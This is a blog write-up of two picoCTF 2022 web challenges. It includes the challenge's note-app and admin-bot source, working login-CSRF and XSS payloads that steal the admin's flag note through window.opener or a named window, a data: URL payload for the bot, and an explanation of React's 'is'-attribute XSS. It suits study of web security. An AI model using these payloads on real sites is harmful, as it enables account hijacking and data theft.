---
title: picoCTF 2022 Notes
catalog: true
date: 2022-04-10 12:03:34
tags: [Security]
categories: [Security]
---

There were two difficult Web questions this time. I solved one, and the other one was unsolvable, but the solution is worth a look. Here's a brief summary.

<!-- more -->

## Noted

Link: https://play.picoctf.org/practice/challenge/282

In short, this is a common system for adding notes. You can see all your notes on the /notes page, and there is a self-XSS vulnerability. Now, an admin who is logged in will visit the URL you provide, and you need to find a way to get the admin's note content.

Code:

``` js
fastify.after(() => {
  fastify.get('/', (req, res) => {
    if (req.user) return res.redirect('/notes');
    return res.view('login');
  });

  fastify.post('/login', { schema: userSchema }, async (req, res) => {
    let { username, password } = req.body;
    username = username.toLowerCase();

    let user = await User.findOne({ where: { username }});
    if (user === null) {
      return res.status(400).send('User not found');
    }

    if (!(await argon2.verify(user.password, password))) {
      return res.status(400).send('Wrong password!');
    }

    req.session.set('user', user.username);

    return res.redirect('/notes');
  });

  fastify.get('/register', (req, res) => {
    return res.view('register');
  });

  fastify.post('/register', { schema: userSchema }, async (req, res) => {
    let { username, password } = req.body;
    username = username.toLowerCase();

    let user = await User.findOne({ where: { username }});
    if (user) {
      return res.status(400).send('User already exists!');
    }

    await User.create({
      username,
      password: await argon2.hash(password)
    });

    req.session.set('user', username);

    return res.redirect('/notes');
  });

  fastify.get('/notes', auth(async (req, res) => {
    return res.view('notes', {
      notes: req.user.notes, 
      csrf: await res.generateCsrf()
    });
  }));

  fastify.get('/new', auth(async (req, res) => {
    return res.view('new', { csrf: await res.generateCsrf() }); 
  }));

  fastify.post('/new', {
    schema: noteSchema,
    preHandler: fastify.csrfProtection
  }, auth(async (req, res) => {
    let { title, content } = req.body;

    await Note.create({
      title,
      content,
      userId: req.user.id
    });

    return res.redirect('/notes');
  }));

  fastify.post('/delete', {
    schema: deleteSchema,
    preHandler: fastify.csrfProtection
  }, auth(async (req, res) => {
    let { id } = req.body;

    let deleted = false;

    for (let note of req.user.notes) {
      if (note.id === id) {
        await note.destroy();

        deleted = true;
      }
    }

    if (deleted) {
      return res.redirect('/notes');
    } else {
      res.status(400).send('Note not found!');
    }
  }));

  fastify.get('/report', auth(async (req, res) => {
    return res.view('report', { csrf: await res.generateCsrf() });
  }));

  fastify.post('/report', {
    schema: reportSchema,
    preHandler: fastify.csrfProtection
  }, auth((req, res) => {
    let { url } = req.body;

    if (report.open) {
      return res.send('Only one browser can be open at a time!');
    } else {
      report.run(url);
    }

    return res.send('URL has been reported.');
  }));
}) 
```

Bot code:

``` js
const crypto = require('crypto');
const puppeteer = require('puppeteer');

async function run(url) {
  let browser;

  try {
    module.exports.open = true;
    browser = await puppeteer.launch({
      headless: true,
      pipe: true,
      args: ['--incognito', '--no-sandbox', '--disable-setuid-sandbox'],
      slowMo: 10
    });

    let page = (await browser.pages())[0]

    await page.goto('http://0.0.0.0:8080/register');
    await page.type('[name="username"]', crypto.randomBytes(8).toString('hex'));
    await page.type('[name="password"]', crypto.randomBytes(8).toString('hex'));

    await Promise.all([
      page.click('[type="submit"]'),
      page.waitForNavigation({ waituntil: 'domcontentloaded' })
    ]);

    await page.goto('http://0.0.0.0:8080/new');
    await page.type('[name="title"]', 'flag');
    await page.type('[name="content"]', process.env.FLAG ?? 'ctf{flag}');

    await Promise.all([
      page.click('[type="submit"]'),
      page.waitForNavigation({ waituntil: 'domcontentloaded' })
    ]);

    await page.goto('about:blank')
    await page.goto(url);
    await page.waitForTimeout(7500);

    await browser.close();
  } catch(e) {
    console.error(e);
    try { await browser.close() } catch(e) {}
  }

  module.exports.open = false;
}

module.exports = { open: false, run }
```

The problem statement says that the admin bot for this question does not have an external connection function, so some additional difficulty has been added (but it seems that it was added back before the competition started, according to Discord).

But let's not discuss this for now, let's discuss other things.

This question has a CSRF token to prevent CSRF, but the login part does not, so you can use CSRF to log in and execute XSS on the admin.

If the same-site cookie is not set, it is easy to iframe, like this:

``` html
<iframe name=f onload=run() src="http://0.0.0.0:8080/notes"></iframe>
<form id=form action="/login" target="_blank">
 <input name="username" value="user01">
 <input name="password" value="password">
</form>
<script>
  function run() {
    form.submit();
  }
</script>
```

First, open an iframe on the page, and the admin's notes will be inside. Then use form CSRF to open a new window.

Then, just create an XSS in your own account, and use `window.opener.frames['f'].document.body` to get the page content. Although the newly opened page is not the same origin as `window.opener`, it can still be accessed because it is the same origin as `window.opener.frames['f']`.

However, the biggest problem with this question is Chrome's default Lax, so the iframe does not carry cookies, so it cannot be used.

A very intuitive solution is to use `window.open`, like this:

``` html
<form id=form action="/login" target="_blank">
 <input name="username" value="user01">
 <input name="password" value="password">
</form>
<script>
  win = window.open('http://0.0.0.0:8080/notes')
  form.submit()
</script>
```

But the biggest problem is that you cannot access the opened window using `window.opener.win` in the new window because it is not the same origin as `window.opener`.

If the two new windows cannot communicate with each other, what should you do?

After thinking for a while, I suddenly had an idea: "Why not just make `window.opener` the page you want to get?"

Like this:

``` html
<form id=form action="/login" target="_blank">
 <input name="username" value="user01">
 <input name="password" value="password">
</form>
<script>
  form.submit()
  location = 'http://0.0.0.0:8080/notes'
</script>
```

It feels like a race condition. After the form is submitted, the page jumps immediately. At this time, because the new login has not been completed, it is still the admin's session, so you can directly get the things in `window.opener.document` after the new window is logged in.

If there is a network connection, it is done. In the case of no external connection, it can be found that the admin bot does not check the URL, so you can pass `javascript:` or `data:` and other things to it, and the part that returns the flag can be directly added as a new note.

To make the admin bot visit the following, just load the html using `data:text/html`:

```
data:text/html,<form id=f method=POST action=http://0.0.0.0:8080/login target=new_window><input name=username value=user01><input name=password value=password></form><script>f.submit();location='http://0.0.0.0:8080/notes'</script>
```

XSS payload, just open a new window to do it, or you can use an iframe.

``` js
<script>
  setTimeout(() => {
    var flag = window.opener.document.body.innerText
    var win = window.open('/new');
    setTimeout(() => {
      win.document.querySelector('textarea[name=content]').value = flag;
      win.document.querySelector('form').submit()
    }, 2000)
  }, 2000)
</script>
```

### Another solution

Using the tricks I learned a few days ago in [iframe and window.open black magic](https://blog.huli.tw/2022/04/07/iframe-and-window-open/), that is, "when opening a window with the same name, you will get a reference instead of opening a new window", so the two new windows can communicate with each other.

``` html
<form id=form action="/login" target="_blank">
 <input name="username" value="user01">
 <input name="password" value="password">
</form>
<script>
  window.open('http://0.0.0.0:8080/notes', 'flag')
  form.submit()
</script>
```

The XSS part is written like this:

``` html
<script>
  var flagWin = window.open('xxx:abdef', 'flag')
  setTimeout(() => {
    var flag = flagWin.document.body.innerText
    var win = window.open('/new');
    setTimeout(() => {
      win.document.querySelector('textarea[name=content]').value = flag;
      win.document.querySelector('form').submit()
    }, 2000)
  }, 2000)
</script>
```

A similar solution was used in this article: https://github.com/Scoder12/ctf/blob/main/PicoCTF%202022/web_noted.md

## Live Art

Link: https://play.picoctf.org/practice/challenge/277?page=1&search=live

I haven't reproduced this problem myself yet, and the solutions are all from this article [picoCTF 2022 WriteUps](https://blog.maple3142.net/2022/03/29/picoctf-2022-writeups/#live-art). I'll briefly summarize it. There are two main vulnerabilities.

1. Confusion of props caused by improper component switching
2. Attacking React using the `is` attribute

The second point is particularly interesting, so I'll talk about it here.

What's wrong with the React app below?

``` js
export default function App() {
  const params = new URLSearchParams(location.search);
  let obj = {};

  params.forEach(function (value, key) {
    obj[key] = value;
  });

  return (
    <div className="App">
      <h1>Demo</h1>
      <img {...obj} />
    </div>
  );
}
```

Here, we just turn the query string on the address bar into an object and pass it to img. The default usage of `URLSearchParams` does not support arrays and objects, so it is impossible to generate `dangerouslySetInnerHTML: { __html: '..'}`.

In other words, if you can control the props of elements in React render today, but the value can only be a string, what can you do?

When React sets attributes, if you write `<img onError="alert(1)">`, an error message will pop up:

```
Expected `onError` listener to be a function, instead got a value of `string` type.
```

If you change it to lowercase, you will get a warning:

> Warning: Invalid event handler property `onerror`. Did you mean `onError`?

The relevant checks are all here: https://github.com/facebook/react/blob/v18.0.0/packages/react-dom/src/shared/ReactDOMUnknownPropertyHook.js#L275

``` js
export function validateProperties(type, props, eventRegistry) {
  if (isCustomComponent(type, props)) {
    return;
  }
  warnUnknownProperties(type, props, eventRegistry);
}
```

And here you can see a `isCustomComponent` judgment, the code is here: https://github.com/facebook/react/blob/v18.0.0/packages/react-dom/src/shared/isCustomComponent.js

``` js
function isCustomComponent(tagName: string, props: Object) {
  if (tagName.indexOf('-') === -1) {
    return typeof props.is === 'string';
  }
  switch (tagName) {
    // These are reserved SVG and MathML elements.
    // We don't mind this list too much because we expect it to never grow.
    // The alternative is to track the namespace in a few places which is convoluted.
    // https://w3c.github.io/webcomponents/spec/custom/#custom-elements-core-concepts
    case 'annotation-xml':
    case 'color-profile':
    case 'font-face':
    case 'font-face-src':
    case 'font-face-uri':
    case 'font-face-format':
    case 'font-face-name':
    case 'missing-glyph':
      return false;
    default:
      return true;
  }
}
```

If the is in props is a string, it will be true.

And React also has some checks when setting attributes: https://github.com/facebook/react/blob/v18.0.0/packages/react-dom/src/client/DOMPropertyOperations.js#L151

Simply put, if it is a custom element (props.is is a string), many attributes will be set directly.

So, if you have the following code:

``` html
function App() {
  return (
    <img src="x" onerror="alert(1)" is="abc" />
  )
}
```

XSS can be triggered! Because of the is, React directly sets the `onerror` attribute.

I'm so excited! This is the first time I've learned about this feature after writing React for so long, and there's another attack surface for attacking React apps.
